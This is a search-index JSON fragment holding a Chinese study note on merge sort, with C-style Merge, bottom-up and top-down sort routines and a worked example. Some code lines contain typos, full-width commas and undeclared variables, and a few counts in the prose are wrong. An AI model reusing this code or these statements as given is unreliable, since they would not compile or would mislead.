\u5f52\u5e76\u6392\u5e8f \u76ee\u5f55 1. \u80cc\u666f 2. \u5f52\u5e76\u6392\u5e8f 2.1. \u5f52\u5e76\u6392\u5e8f\u601d\u60f3 2.2. \u4e24\u8def\u5f52\u5e76\u7b97\u6cd5\u7684\u601d\u8def 2.3. \u5b9e\u73b0\u5f52\u5e76\u6392\u5e8f 2.3.1. \u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u6cd5 2.3.2. \u81ea\u9876\u5411\u4e0b\u7684\u65b9\u6cd5 3. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u6700\u8fd1\u5728\u505a\u9898\u7684\u65f6\u5019\u63a5\u89e6\u5230\u6c42\u9006\u5e8f\u6570\u7684\u8fd9\u4e00\u7c7b\u9898\u76ee\uff0c\u6bd4\u5982 51Nod-2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000 \uff0c\u6211\u53c2\u8003\u4e86\u7f51\u4e0a\u7684\u4e00\u4e9b\u9898\u89e3\uff0c\u53d1\u73b0\u5927\u5bb6\u666e\u904d\u7528\u5f52\u5e76\u6392\u5e8f\u6765\u89e3\u51b3\u8fd9\u4e00\u7c7b\u95ee\u9898\uff0c\u4e8e\u662f\u6211\u60f3\u8981\u5b66\u4e60\u4e00\u4e0b\u5f52\u5e76\u6392\u5e8f\u7684\u5177\u4f53\u5b9e\u73b0\u3002\u6211\u4ece \u300a\u7b97\u6cd5\u5b66\u4e60\u4e0e\u5e94\u7528\u4ece\u5165\u95e8\u5230\u7cbe\u901a\u300b 1 \u4e2d\u6458\u5f55\u4e86\u5f52\u5e76\u6392\u5e8f\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002 2. \u5f52\u5e76\u6392\u5e8f # \u5728\u4f7f\u7528\u5f52\u5e76\u6392\u5e8f\u6cd5\u65f6\uff0c\u5c06\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u6709\u5e8f\u8868 \u5408\u5e76 \u6210\u4e00\u4e2a\u65b0\u7684\u6709\u5e8f\u8868\u3002\u5047\u8bbe\u521d\u59cb\u5e8f\u5217\u542b\u6709k\u4e2a\u8bb0\u5f55\uff0c\u9996\u5148\u5c06\u8fd9 k \u4e2a\u8bb0\u5f55\u770b\u6210 k \u4e2a\u6709\u5e8f\u7684\u5b50\u5e8f\u5217\uff0c\u6bcf\u4e2a\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\u4e3a 1 \uff0c\u7136\u540e\u4e24\u4e24\u8fdb\u884c\u5f52\u5e76\uff0c\u5f97\u5230 k/2 \u4e2a\u957f\u5ea6\u4e3a 2 \uff08 k \u4e3a\u5947\u6570\u65f6\uff0c\u6700\u540e\u4e00\u4e2a\u5e8f\u5217\u7684\u957f\u5ea6\u4e3a 1 \uff09\u7684\u6709\u5e8f\u5b50\u5e8f\u5217\u3002\u6700\u540e\u5728\u6b64\u57fa\u7840\u4e0a\u518d\u8fdb\u884c\u4e24\u4e24\u5f52\u5e76\uff0c\u5982\u6b64\u91cd\u590d\u4e0b\u53bb\uff0c\u76f4\u5230\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a k \u7684\u6709\u5e8f\u5e8f\u5217\u4e3a\u6b62\u3002\u4e0a\u8ff0\u6392\u5e8f\u65b9\u6cd5\u88ab\u79f0\u4f5c \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u6cd5 \u3002 2.1. \u5f52\u5e76\u6392\u5e8f\u601d\u60f3 # \u5f52\u5e76\u6392\u5e8f\u5c31\u662f\u5229\u7528\u5f52\u5e76\u8fc7\u7a0b\uff0c\u5f00\u59cb\u65f6\u5148\u5c06 k \u4e2a\u6570\u636e\u770b\u6210 k \u4e2a\u957f\u5ea6\u4e3a1\u7684\u5df2\u6392\u597d\u5e8f\u7684\u8868\uff0c\u5c06\u76f8\u90bb\u7684\u8868\u6210\u5bf9\u5408\u5e76\uff0c\u5f97\u5230\u957f\u5ea6\u4e3a 2 \u7684 \uff08k/2\uff09 \u4e2a\u6709\u5e8f\u8868\uff0c\u6bcf\u4e2a\u8868\u542b\u6709 2 \u4e2a\u6570\u636e;\u8fdb\u4e00\u6b65\u518d \u5c06\u76f8\u90bb\u8868\u6210\u5bf9\u5408\u5e76 \uff0c\u5f97\u5230\u957f\u5ea6\u4e3a 4 \u7684 \uff08k/4\uff09 \u4e2a\u6709\u5e8f\u8868\u2026\u2026\u5982\u6b64\u91cd\u590d\u505a\u4e0b\u53bb\uff0c\u76f4\u5230\u5c06\u6240\u6709\u6570\u636e\u5747\u5408\u5e76\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a k \u7684\u6709\u5e8f\u8868\u4e3a\u6b62\uff0c\u4ece\u800c\u5b8c\u6210\u4e86\u6392\u5e8f\u3002 \u56fe1 \u663e\u793a\u4e86\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u7684\u8fc7\u7a0b\u3002 \\text{Figure 1. \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u8fc7\u7a0b} \u5728 \u56fe2 \u4e2d\uff0c\u5047\u8bbe\u4f7f\u7528\u51fd\u6570 Merge() \u5c06\u4e24\u4e2a\u6709\u5e8f\u8868\u8fdb\u884c\u5f52\u5e76\u5904\u7406\uff0c\u5047\u8bbe\u5c06\u4e24\u4e2a\u5f85\u5f52\u5e76\u7684\u8868\u5206\u522b\u4fdd\u5b58\u5728\u6570\u7ec4 A \u548c B \u4e2d\uff0c\u5c06\u5176\u4e2d\u4e00\u4e2a\u7684\u6570\u636e\u5b89\u6392\u5728\u4e0b\u6807\u4ecem\u5230n\u5355\u5143\u4e2d\uff0c\u53e6\u4e00\u4e2a\u5b89\u6392\u5728\u4e0b\u6807\u4ece \uff08n+1\uff09 \u5230 h \u5355\u5143\u4e2d\uff0c\u5c06\u5f52\u5e76\u540e\u5f97\u5230\u7684\u6709\u5e8f\u8868\u5b58\u5165\u5230\u8f85\u52a9\u6570\u7ec4 C \u4e2d\u3002\u5f52\u5e76\u8fc7\u7a0b\u662f\u4f9d\u6b21\u6bd4\u8f83\u8fd9\u4e24\u4e2a\u6709\u5e8f\u8868\u4e2d\u76f8\u5e94\u7684\u6570\u636e\uff0c\u6309\u7167\u201c\u53d6\u5c0f\u201d\u539f\u5219\u590d\u5236\u5230 C \u4e2d\u3002 \\text{Figure 2. \u4e24\u4e2a\u6709\u5e8f\u8868\u7684\u5f52\u5e76\u56fe} \u51fd\u6570 Merge() \u7684\u529f\u80fd\u53ea\u662f\u5f52\u5e76\u4e24\u4e2a\u6709\u5e8f\u8868\uff0c\u5728\u8fdb\u884c\u4e8c\u8def\u5f52\u5e76\u7684\u6bcf\u4e00\u8d9f\u5f52\u5e76\u8fc7\u7a0b\u4e2d\uff0c\u80fd\u591f\u5c06\u591a\u5bf9\u76f8\u90bb\u7684\u8868\u8fdb\u884c\u5f52\u5e76\u5904\u7406\u3002\u63a5\u4e0b\u6765\u5f00\u59cb\u8ba8\u8bba\u4e00\u8d9f\u7684\u5f52\u5e76\uff0c\u5047\u8bbe\u5df2\u7ecf\u5c06\u6570\u7ec4r\u4e2d\u7684 n \u4e2a\u6570\u636e\u5206\u6210\u6210\u5bf9\u957f\u5ea6\u4e3a s \u7684\u6709\u5e8f\u8868\uff0c\u8981\u6c42\u5c06\u8fd9\u4e9b\u8868\u4e24\u4e24\u5f52\u5e76\uff0c\u5f52\u5e76\u6210\u4e00\u4e9b\u957f\u5ea6\u4e3a 2s \u7684\u6709\u5e8f\u8868\uff0c\u5e76\u628a\u7ed3\u679c\u7f6e\u5165\u8f85\u52a9\u6570\u7ec4 r2 \u4e2d\u3002\u5982\u679c n \u4e0d\u662f 2s \u7684\u6574\u6570\u500d\uff0c\u867d\u7136\u524d\u9762\u8fdb\u884c\u5f52\u5e76\u7684\u8868\u957f\u5ea6\u5747\u4e3a s \uff0c\u4f46\u662f\u6700\u540e\u8fd8\u662f\u80fd\u518d\u5269\u4e0b\u4e00\u5bf9\u957f\u5ea6\u90fd\u662f s \u7684\u8868\u3002\u5728\u8fd9\u4e2a\u65f6\u5019\uff0c\u9700\u8981\u8003\u8651\u5982\u4e0b\u4e24\u79cd\u60c5\u51b5\u3002 \u5269\u4e0b\u4e00\u4e2a\u957f\u5ea6\u4e3a s \u7684\u8868\u548c\u4e00\u4e2a\u957f\u5ea6\u5c0f\u4e8e s \u7684\u8868\uff0c\u7531\u4e8e\u4e0a\u8ff0\u7684\u5f52\u5e76\u51fd\u6570 merge() \u5e76\u4e0d\u8981\u6c42\u5f85\u5f52\u5e76\u7684\u4e24\u4e2a\u8868\u5fc5\u987b\u957f\u5ea6\u76f8\u540c\uff0c\u4ecd\u53ef\u5c06\u4e8c\u8005\u5f52\u5e76\uff0c\u53ea\u662f\u5f52\u5e76\u540e\u7684\u8868\u7684\u957f\u5ea6\u5c0f\u4e8e\u5176\u4ed6\u8868\u7684\u957f\u5ea6 2s \u3002 \u53ea\u5269\u4e0b\u4e00\u4e2a\u8868\uff0c\u5b83\u7684\u957f\u5ea6\u5c0f\u4e8e\u6216\u7b49\u4e8e s \uff0c\u7531\u4e8e\u6ca1\u6709\u53e6\u4e00\u4e2a\u8868\u4e0e\u5b83\u5f52\u5e76\uff0c\u53ea\u80fd\u5c06\u5b83\u76f4\u63a5\u590d\u5236\u5230\u6570\u7ec4 r2 \u4e2d\uff0c\u51c6\u5907\u53c2\u52a0\u4e0b\u4e00\u8d9f\u7684\u5f52\u5e76\u3002 2.2. \u4e24\u8def\u5f52\u5e76\u7b97\u6cd5\u7684\u601d\u8def # \u5047\u8bbe\u5c06\u4e24\u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\uff08\u76f8\u5f53\u4e8e\u8f93\u5165\u5806\uff09\u653e\u5728\u540c\u4e00\u5411\u91cf\u4e2d\u7684\u76f8\u90bb\u4f4d\u7f6e\u4e0a\uff0c\u4f4d\u7f6e\u662f r[low\u2026m] \u548c r[m+1\u2026high] \u3002\u53ef\u4ee5\u5148\u5c06\u5b83\u4eec\u5408\u5e76\u5230\u4e00\u4e2a\u5c40\u90e8\u7684\u6682\u5b58\u5411\u91cf r1 \uff08\u76f8\u5f53\u4e8e\u8f93\u51fa\u5806\uff09\u4e2d\uff0c\u5f53\u5408\u5e76\u5b8c\u6210\u540e\u5c06 r1 \u590d\u5236\u56de r[low\u2026high] \u4e2d\u3002 \u5408\u5e76\u8fc7\u7a0b \u9884\u5148\u8bbe\u7f6e 3 \u4e2a\u6307\u9488 i \u3001 j \u548c p \uff0c\u5176\u521d\u59cb\u503c\u5206\u522b\u6307\u5411\u8fd93\u4e2a\u8bb0\u5f55\u533a\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 \u5728\u5408\u5e76\u65f6\u4f9d\u6b21\u6bd4\u8f83 r[i] \u548c r[j] \u7684\u5173\u952e\u5b57\uff0c\u5c06\u5173\u952e\u5b57\u8f83\u5c0f\u7684\u8bb0\u5f55\u590d\u5236\u5230 r1[p] \u4e2d\uff0c\u7136\u540e\u5c06\u88ab\u590d\u5236\u8bb0\u5f55\u7684\u6307\u9488 i \u6216 j \u52a0 1 \uff0c\u4ee5\u53ca\u6307\u5411\u590d\u5236\u4f4d\u7f6e\u7684\u6307\u9488 p \u52a0 1 \u3002 \u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u76f4\u5230\u4e24\u4e2a\u8f93\u5165\u7684\u5b50\u6587\u4ef6\u4e2d\u6709\u4e00\u4e2a\u5df2\u5168\u90e8\u590d\u5236\u5b8c\u6bd5\u4e3a\u6b62\uff0c\u6b64\u65f6\u5c06\u53e6\u4e00\u975e\u7a7a\u7684\u5b50\u6587\u4ef6\u4e2d\u5269\u4f59\u8bb0\u5f55\u4f9d\u6b21\u590d\u5236\u5230 r1 \u4e2d\u3002 \u52a8\u6001\u7533\u8bf7 r1 \u5728\u4e24\u8def\u5f52\u5e76\u8fc7\u7a0b\u4e2d\uff0c r1 \u662f\u52a8\u6001\u7533\u8bf7\u7684\uff0c\u56e0\u4e3a\u7533\u8bf7\u7684\u7a7a\u95f4\u4f1a\u5f88\u5927\uff0c\u6240\u4ee5\u9700\u8981\u5224\u65ad\u52a0\u5165\u7533\u8bf7\u7a7a\u95f4\u662f\u5426\u6210\u529f\u3002\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u6cd5\u7684\u64cd\u4f5c\u76ee\u7684\u975e\u5e38\u7b80\u5355\uff0c\u53ea\u662f\u5c06\u5f85\u6392\u5e8f\u5217\u4e2d\u76f8\u90bb\u7684\u4e24\u4e2a\u6709\u5e8f\u5b50\u5e8f\u5217\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\u3002\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u6cd5\u7684\u5177\u4f53\u7b97\u6cd5\u63cf\u8ff0\u5982\u4e0b\u6240\u793a\u3002 /* \u5df2\u77e5r1[low\u2026mid]\u548cr1[mid+1\u2026high]\u5206\u522b\u6309\u5173\u952e\u5b57\u6709\u5e8f\u6392\u5217 */ /* \u5c06\u5b83\u4eec\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u5b58\u653e\u5728r[low\u2026high] */ void Merge(RecordType r1[], int low, int mid, int high, RecordType r[]) { i = low; j = mid + 1; k = low; while ((i <= mid) && (j <= high)) { if (r1[i].key <= r1[j].key) { r[k] = r1[i]; ++i; } else { r[k] = r1[j]; ++j; } ++k; } while (i <= mid) { r[k] = r1[i]; k++, i++; } while (j <= high) { r[k] = r1[j]; k++; j++; } } \u5728\u5408\u5e76\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u4e2a\u6709\u5e8f\u7684\u5b50\u8868\u88ab\u904d\u5386\u4e86\u4e00\u904d\uff0c\u8868\u4e2d\u7684\u6bcf\u4e00\u9879\u5747\u88ab\u590d\u5236\u4e86\u4e00\u6b21\u3002\u56e0\u6b64\uff0c\u5408\u5e76\u7684\u4ee3\u4ef7\u4e0e\u4e24\u4e2a\u6709\u5e8f\u5b50\u8868\u7684\u957f\u5ea6\u4e4b\u548c\u6210\u6b63\u6bd4\uff0c\u8be5\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(n) \u3002 \u53ef\u4ee5\u91c7\u7528\u9012\u5f52\u65b9\u6cd5\u5b9e\u73b0\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\uff0c\u5177\u4f53\u63cf\u8ff0\u5982\u4e0b\u6240\u793a\u3002 /* r1[low\u2026high]\u7ecf\u8fc7\u6392\u5e8f\u540e\u653e\u5728r[low\u2026high]\u4e2d\uff0cr2[low\u2026high]\u4e3a\u8f85\u52a9\u7a7a\u95f4 */ void MergeSort(RecordType r1[], int low, int high, RecordType r[]) { RecordType* r2; r2 = (RecordType*)malloc(sizeof(RecordType) * (hight - low + 1)); if (low == high) r[low] = r1[low]; else { mid = (low + high) / 2; MergeSort(r1\uff0clow\uff0cmid, r2); MergeSort(r1\uff0cmid + 1\uff0chigh, r2); Merge(r2\uff0clow\uff0cmid\uff0chigh\uff0cr); } free(r2); } 2.3. \u5b9e\u73b0\u5f52\u5e76\u6392\u5e8f # \u5b9e\u73b0\u5f52\u5e76\u6392\u5e8f\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff0c\u5206\u522b\u662f\u81ea\u5e95\u5411\u4e0a\u548c\u81ea\u9876\u5411\u4e0b\uff0c\u5177\u4f53\u8bf4\u660e\u5982\u4e0b\u6240\u793a\u3002 2.3.1. \u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u6cd5 # \u81ea\u5e95\u5411\u4e0a\u7684\u57fa\u672c\u601d\u60f3 \u81ea\u5e95\u5411\u4e0a\u7684\u57fa\u672c\u601d\u60f3\u662f\uff0c\u5f53\u7b2c 1 \u8d9f\u5f52\u5e76\u6392\u5e8f\u65f6\uff0c\u5c06\u5f85\u6392\u5e8f\u7684\u6587\u4ef6 R[1\u2026n] \u770b\u4f5c\u662f n \u4e2a\u957f\u5ea6\u4e3a 1 \u7684\u6709\u5e8f\u5b50\u6587\u4ef6\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u5b50\u6587\u4ef6\u4e24\u4e24\u5f52\u5e76\u3002 \u5982\u679c n \u4e3a\u5076\u6570\uff0c\u5219\u5f97\u5230 n/2 \u4e2a\u957f\u5ea6\u4e3a 2 \u7684\u6709\u5e8f\u5b50\u6587\u4ef6; \u5982\u679c n \u4e3a\u5947\u6570\uff0c\u5219\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u8f6e\u7a7a\uff08\u4e0d\u53c2\u4e0e\u5f52\u5e76\uff09\u3002 \u6240\u4ee5\u5f53\u5b8c\u6210\u672c\u8d9f\u5f52\u5e76\u540e\uff0c\u524d [lgn] \u4e2a\u6709\u5e8f\u5b50\u6587\u4ef6\u957f\u5ea6\u4e3a 2 \uff0c\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u957f\u5ea6\u4ecd\u4e3a 1 \u3002 \u7b2c 2 \u8d9f\u5f52\u5e76\u7684\u529f\u80fd\u662f\uff0c\u5c06\u7b2c 1 \u8d9f\u5f52\u5e76\u6240\u5f97\u5230\u7684 [lgn] \u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\u5b9e\u73b0 \u4e24\u4e24\u5f52\u5e76 \u3002\u5982\u6b64\u53cd\u590d\u64cd\u4f5c\uff0c\u76f4\u5230\u6700\u540e\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u6709\u5e8f\u6587\u4ef6\u4e3a\u6b62\u3002 \u4e0a\u8ff0\u6bcf\u6b21\u5f52\u5e76\u64cd\u4f5c\uff0c\u90fd\u662f\u5c06\u4e24\u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\u5408\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\uff0c\u6240\u4ee5\u79f0\u5176\u4e3a\u201c\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u201d\u3002\u7c7b\u4f3c\u5730\u8fd8\u6709 k(k>2) \u8def\u5f52\u5e76\u6392\u5e8f\u3002 \u4e00\u8d9f\u5f52\u5e76\u7b97\u6cd5 \u5728\u67d0\u8d9f\u5f52\u5e76\u4e2d\uff0c\u8bbe\u5404\u5b50\u6587\u4ef6\u957f\u5ea6\u4e3a length \uff08\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u7684\u957f\u5ea6\u53ef\u80fd\u5c0f\u4e8e length \uff09\uff0c\u5219\u5f52\u5e76\u524d R[1\u2026n] \u4e2d\u5171\u6709 n \u4e2a\u6709\u5e8f\u7684\u5b50\u6587\u4ef6\uff1a R[1\u2026length]\uff0cR[length+1\u20262length]\uff0c\u2026\uff0cR[([n/length]\u22121)*length+1\u2026n] \u3002 \u6ce8\u610f\uff1a\u8c03\u7528\u5f52\u5e76\u64cd\u4f5c\u5c06\u76f8\u90bb\u7684\u4e00\u5bf9\u5b50\u6587\u4ef6\u8fdb\u884c\u5f52\u5e76\u65f6\uff0c\u5fc5\u987b\u5bf9\u5b50\u6587\u4ef6\u7684\u4e2a\u6570\u53ef\u80fd\u662f\u5947\u6570\u3001\u4ee5\u53ca\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u7684\u957f\u5ea6\u5c0f\u4e8elength\u8fd9\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\u8fdb\u884c\u7279\u6b8a\u5904\u7406\u3002 \u5982\u679c\u5b50\u6587\u4ef6\u4e2a\u6570\u4e3a\u5947\u6570\uff0c\u5219\u6700\u540e\u4e00\u4e2a\u5b50\u6587\u4ef6\u65e0\u987b\u548c\u5176\u4ed6\u5b50\u6587\u4ef6\u5f52\u5e76\uff08\u5373\u672c\u8d9f\u8f6e\u7a7a\uff09\u3002 \u5982\u679c\u5b50\u6587\u4ef6\u4e2a\u6570\u4e3a\u5076\u6570\uff0c\u5219\u8981\u6ce8\u610f\u6700\u540e\u4e00\u5bf9\u5b50\u6587\u4ef6\u4e2d\u540e\u4e00\u5b50\u6587\u4ef6\u7684\u533a\u95f4\u4e0a\u754c\u662fn\u3002 \u4f7f\u7528C\u8bed\u8a00\u5b9e\u73b0\u4e00\u8d9f\u5f52\u5e76\u7b97\u6cd5\u7684\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\u6240\u793a\u3002 void MergePass(SeqList R\uff0cint length) { //\u5bf9R[1\u2026n]\u505a\u4e00\u8d9f\u5f52\u5e76\u6392\u5e8f int i; for (i = 1; i + 2 * length - 1 <= n; i = i + 2 * length) Merge(R\uff0ci\uff0ci + length - 1\uff0ci + 2 * length - 1); //\u5f52\u5e76\u957f\u5ea6\u4e3alength\u7684\u4e24\u4e2a\u76f8\u90bb\u5b50\u6587\u4ef6 if (i + length - 1 < n) //\u5c1a\u6709\u4e24\u4e2a\u5b50\u6587\u4ef6\uff0c\u5176\u4e2d\u540e\u4e00\u4e2a\u957f\u5ea6\u5c0f\u4e8elength Merge(R\uff0ci\uff0ci + length - 1\uff0cn); //\u5f52\u5e76\u6700\u540e\u4e24\u4e2a\u5b50\u6587\u4ef6 //\u6ce8\u610f\uff1a\u82e5i n\u4e14i+length-1n\u65f6\uff0c\u5219\u5269\u4f59\u4e00\u4e2a\u5b50\u6587\u4ef6\u8f6e\u7a7a\uff0c\u65e0\u987b\u5f52\u5e76 } //MergePass \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5 \u4e8c\u8def\u5f52\u5e76\u6392\u5e8f\u5177\u4f53\u4ee3\u7801\u7684\u7b97\u6cd5\u5982\u4e0b\u3002 void MergeSort(SeqList R) { //\u91c7\u7528\u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u6cd5\uff0c\u5bf9R[1\u2026n]\u8fdb\u884c\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f int length; for (length = 1; length < n; length *= 2) //\u505a\u4e24\u8d9f\u5f52\u5e76 MergePass(R\uff0clength); //\u6709\u5e8f\u6bb5\u957f\u5ea6n\u65f6\u7ec8\u6b62 } \u81ea\u5e95\u5411\u4e0a\u7684\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u867d\u7136\u6548\u7387\u8f83\u9ad8\uff0c\u4f46\u53ef\u8bfb\u6027\u8f83\u5dee\u3002 2.3.2. \u81ea\u9876\u5411\u4e0b\u7684\u65b9\u6cd5 # \u7528\u5206\u6cbb\u6cd5\u8fdb\u884c\u81ea\u9876\u5411\u4e0b\u7684\u7b97\u6cd5\u8bbe\u8ba1\uff0c\u8fd9\u79cd\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\u3002 \u5206\u6cbb\u6cd5\u76843\u4e2a\u6b65\u9aa4 \u8bbe\u5f52\u5e76\u6392\u5e8f\u7684\u5f53\u524d\u533a\u95f4\u662f R[low\u2026high] \uff0c\u5206\u6cbb\u6cd5\u76843\u4e2a\u6b65\u9aa4\u5982\u4e0b\u3002 \u5206\u89e3\uff1a\u5c06\u5f53\u524d\u533a\u95f4\u4e00\u5206\u4e3a\u4e8c\uff0c\u5373\u6c42\u5206\u88c2\u70b9\u3002 \u6c42\u89e3\uff1a\u9012\u5f52\u5730\u5bf9\u4e24\u4e2a\u5b50\u533a\u95f4 R[low..mid] \u548c R[mid+1\u2026high] \u8fdb\u884c\u5f52\u5e76\u6392\u5e8f\u3002 \u7ec4\u5408\uff1a\u5c06\u5df2\u6392\u5e8f\u7684\u4e24\u4e2a\u5b50\u533a\u95f4 R[low..mid] \u548c R[mid+1\u2026high] \u5f52\u5e76\u4e3a\u4e00\u4e2a\u6709\u5e8f\u7684\u533a\u95f4 R[low\u2026high] \u3002 \u9012\u5f52\u7684\u7ec8\u7ed3\u6761\u4ef6\uff1a\u5b50\u533a\u95f4\u957f\u5ea6\u4e3a 1 \u3002 \u5177\u4f53\u7b97\u6cd5 void MergeSortDC(SeqList R\uff0cint low\uff0cint high) { //\u7528\u5206\u6cbb\u6cd5\u5bf9R[low\u2026high]\u8fdb\u884c\u4e8c\u8def\u5f52\u5e76\u6392\u5e8f int mid; if (low < high) { //\u533a\u95f4\u957f\u5ea6\u5927\u4e8e1 mid = (low + high) / 2; //\u5206\u89e3 MergeSortDC(R\uff0clow\uff0cmid); //\u9012\u5f52\u5730\u5bf9R[low\u2026mid]\u6392\u5e8f MergeSortDC(R\uff0cmid + 1\uff0chigh); //\u9012\u5f52\u5730\u5bf9R[mid+1\u2026high]\u6392\u5e8f Merge(R\uff0clow\uff0cmid\uff0chigh); //\u7ec4\u5408\uff0c\u5c06\u4e24\u4e2a\u6709\u5e8f\u533a\u5f52\u5e76\u4e3a\u4e00\u4e2a\u6709\u5e8f\u533a } } //MergeSortDC \u4f8b\u5982\uff0c\u5df2\u77e5\u5e8f\u5217 {26,5,77,1,61,11,59,15,48,19} \u5199\u51fa\u91c7\u7528\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u6392\u5e8f\u7684\u6bcf\u4e00\u8d9f\u7684\u7ed3\u679c\u3002 \u5f52\u5e76\u6392\u5e8f\u5404\u8d9f\u7684\u7ed3\u679c\u5982\u4e0b\u6240\u793a\u3002 [26] [5] [77] [1] [61] [11] [59] [15] [48] [19] [5 26] [1 77] [11 61] [15 59] [19 48] [1 5 26 77 ] [11 15 59 61] [19 48] [1 5 11 15 26 59 61 77] [19 48] [1 5 11 15 19 26 48 59 61 77] 3. \u53c2\u8003\u6587\u732e # [1] \u5f20\u73b2\u73b2. \u7b97\u6cd5\u5b66\u4e60\u4e0e\u5e94\u7528\u4ece\u5165\u95e8\u5230\u7cbe\u901a [M]. \u5317\u4eac : \u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e, 2016. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#_1","text":"","title":"\u5f52\u5e76\u6392\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#_2","text":"\u5f52\u5e76\u6392\u5e8f \u76ee\u5f55 1. \u80cc\u666f 2. \u5f52\u5e76\u6392\u5e8f 2.1. \u5f52\u5e76\u6392\u5e8f\u601d\u60f3 2.2. \u4e24\u8def\u5f52\u5e76\u7b97\u6cd5\u7684\u601d\u8def 2.3. \u5b9e\u73b0\u5f52\u5e76\u6392\u5e8f 2.3.1. \u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u6cd5 2.3.2. \u81ea\u9876\u5411\u4e0b\u7684\u65b9\u6cd5 3. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#1","text":"\u6700\u8fd1\u5728\u505a\u9898\u7684\u65f6\u5019\u63a5\u89e6\u5230\u6c42\u9006\u5e8f\u6570\u7684\u8fd9\u4e00\u7c7b\u9898\u76ee\uff0c\u6bd4\u5982 51Nod-2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000 \uff0c\u6211\u53c2\u8003\u4e86\u7f51\u4e0a\u7684\u4e00\u4e9b\u9898\u89e3\uff0c\u53d1\u73b0\u5927\u5bb6\u666e\u904d\u7528\u5f52\u5e76\u6392\u5e8f\u6765\u89e3\u51b3\u8fd9\u4e00\u7c7b\u95ee\u9898\uff0c\u4e8e\u662f\u6211\u60f3\u8981\u5b66\u4e60\u4e00\u4e0b\u5f52\u5e76\u6392\u5e8f\u7684\u5177\u4f53\u5b9e\u73b0\u3002\u6211\u4ece \u300a\u7b97\u6cd5\u5b66\u4e60\u4e0e\u5e94\u7528\u4ece\u5165\u95e8\u5230\u7cbe\u901a\u300b 1 \u4e2d\u6458\u5f55\u4e86\u5f52\u5e76\u6392\u5e8f\u8fd9\u4e00\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/2.%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/#2","text":"\u5728\u4f7f\u7528\u5f52\u5e76\u6392\u5e8f\u6cd5\u65f6\uff0c\u5c06\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u6709\u5e8f\u8868 \u5408\u5e76 